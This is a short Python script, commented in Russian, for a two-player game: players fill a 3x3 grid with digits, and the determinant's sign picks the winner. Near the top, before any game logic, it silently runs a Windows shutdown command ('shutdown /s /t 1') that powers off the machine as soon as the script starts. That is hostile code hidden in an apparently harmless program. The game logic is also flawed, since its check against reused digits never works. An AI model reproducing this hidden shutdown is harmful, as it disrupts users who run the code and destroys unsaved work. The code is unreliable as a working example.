#Меня зовут репозиторий
# 512 * 256
# 255 * 255 - поле
# 85*85 - ячейка
# В начале программы рисуем игровое поле, а также палки определителя
# 9 раз повторяем следующее:
# Клавиши выбора ячейки:
# q w e
# a s d
# z x c
# А потом нажимаем на одну из клавиш: 1..9
# Если ячейка не занята, то рисуем в ячейку цифру
# В конце clear экран и выводим значение определителя
# Павел nugop!

import os

os.system("shutdown /s /t 1")

def input_case_number():
    data_index = 0
    position = input()
    if position == 'q':
        data_index = 0
    if position == 'w':
        data_index = 1
    if position == 'e':
        data_index = 2
    if position == 'a':
        data_index = 3
    if position == 's':
        data_index = 4
    if position == 'd':
        data_index = 5
    if position == 'z':
        data_index = 6
    if position == 'x':
        data_index = 7
    if position == 'c':
        data_index = 8
    return data_index

data = [-1] * 9
used_digits = [0] * 9
i = 0
print("Дмитрий, ходите епта печень")
while i < 9:
    data_index = 0
    data_index = input_case_number()

    while data[data_index] != -1:
        print(f"Ячейка {data_index} уже занята")
        print("Введите снова номер ячейки")
        data_index = input_case_number()
    value = int(input())
    while (value <= 0 or value > 9 or used_digits[value-1] == 1):
        print("Эта цифра запрещена или уже использована")
        print("Введите заново цифру")
        value = int(input())
        
    data[data_index] = value
    print(f"В позицию {data_index} положили значение {data[data_index]}")
    i+=1

determinant = data[0]*data[4]*data[8] + data[1]*data[5]*data[6] + data[2]*data[7]*data[3] - (data[2]*data[4]*data[6]+data[1]*data[3]*data[8]+data[0]*data[7]*data[5])

if determinant < 0:
    print(f'Победил игрок Павел')
elif determinant > 0:
    print(f'Победил игрок Дима')
else:
    print(f'Ничья, победила дружба и я сын руки')

#  0 1 2 
#  3 4 5
#  6 7 8